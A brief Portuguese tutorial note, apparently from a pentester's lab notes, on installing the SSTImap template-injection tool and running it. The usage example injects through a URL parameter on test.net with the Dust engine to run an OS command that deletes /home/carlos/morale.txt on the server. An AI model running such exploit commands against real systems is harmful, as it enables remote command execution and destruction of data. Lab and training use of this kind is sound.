
Instalando

```
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap/
python3 -m venv sstimap_env
source sstimap_env/bin/activate
pip install -r requirements.txt
sudo ln -s /home/acosta/work/Area_de_trabalho/tools/web/3_exploitation/SSTImap/sstimap.py /home/acosta/.local/bin/sstimap
```

Utilizando da maneira mais básica:

```
sstimap -u https://test.net/?message=* --os-cmd "rm /home/carlos/morale.txt" -e Dust
```

-e: Engine para ser explorada
--os-cmd: comando a ser executado